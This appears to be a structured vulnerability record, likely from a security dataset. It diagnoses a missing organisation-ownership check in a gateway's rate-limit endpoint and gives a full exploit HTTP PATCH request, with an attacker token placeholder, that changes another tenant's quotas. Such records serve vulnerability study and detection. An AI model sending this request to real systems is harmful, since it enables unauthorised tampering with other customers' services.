diagnosis: The rate limiting configuration endpoint retrieves RateLimitPolicy by policy_pk in Redis OM and updates request-per-minute limits. It never verifies that policy.org_id matches current_user.org_id, allowing any customer to alter rate-limiting quotas on other developers' API gateways.
exploit_request:
PATCH /gateway/rate-limits/01HJBB0912KMA8192038104AA HTTP/1.1
Host: api.konggateway.io
Authorization: Bearer <attacker_jwt>
Content-Type: application/json

{"requests_per_minute": 1000000, "burst_allowance": 500000}
